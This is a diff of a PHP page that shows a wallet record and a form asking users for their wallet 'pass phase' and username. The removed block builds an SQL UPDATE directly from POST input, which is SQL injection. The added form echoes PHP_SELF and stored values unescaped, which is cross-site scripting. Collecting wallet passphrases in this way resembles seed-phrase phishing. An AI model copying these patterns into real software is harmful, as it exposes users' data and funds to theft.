@@ -4,20 +4,6 @@ $sql = "SELECT * FROM wallet WHERE wallet_owner_id = $user_id";
 $result = $conn->query($sql);
 $row = $result->fetch_assoc();
 $wallet_id = $row['wallet_id'];
-if (isset($_POST[$wallet_id])) {
-    $wallet_phase = $_POST['wallet_phase'];
-    $wallet_username = $_POST['wallet_username'];
-    $wallet_id = $_POST[$wallet_id];
-
-    // Assuming your database connection is already established ($conn)
-    $sql = "UPDATE wallet SET wallet_phase = '$wallet_phase', wallet_username = '$wallet_username', wallet_status = 1 WHERE wallet_owner_id = $user_id AND wallet_id = $wallet_id";
-
-    if ($conn->query($sql) === TRUE) {
-        header("location: /connect_wallet?success-added");
-    } else {
-        echo "Error updating record: " . $conn->error;
-    }
-}
 
 if ($result->num_rows > 0) {
     while ($row = $result->fetch_assoc()) {
@@ -71,17 +57,20 @@ if ($result->num_rows > 0) {
 
                         <!-- Modal Body -->
                         <div class="modal-body">
-                            <form method="post">
-                                <input type="hidden" value="<?=$wallet_id?>" name="<?=$wallet_id?>">
+                            <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
+                                <input type="hidden" name="wallet_id" value="<?php echo $wallet_id; ?>">
+
                                 <div class="form-group">
-                                    <label>Pass Phase</label>
-                                    <input type="text" class="form-control" name="wallet_phase" placeholder="Enter your <?=$wallet_key_name?> pass phase">
+                                    <label for="wallet_username">Wallet Username:</label>
+                                    <input type="text" class="form-control" name="wallet_username" value="<?php echo $wallet_username; ?>" required>
                                 </div>
+
                                 <div class="form-group">
-                                    <label for="<?=$wallet_key_name?>_username">Wallet Username</label>
-                                    <input type="text" class="form-control" name="wallet_username" placeholder="Enter your <?=$wallet_key_name?> username">
+                                    <label for="wallet_phase">Wallet Phase:</label>
+                                    <input type="text" class="form-control" name="wallet_phase" value="<?php echo $wallet_phase; ?>" required>
                                 </div>
-                                <button type="submit" class="btn btn-primary" name="<?=$wallet_id?>">Submit</button>
+
+                                <button type="submit" name="<?php echo $wallet_id; ?>">Update Record</button>
                             </form>
                         </div>
 
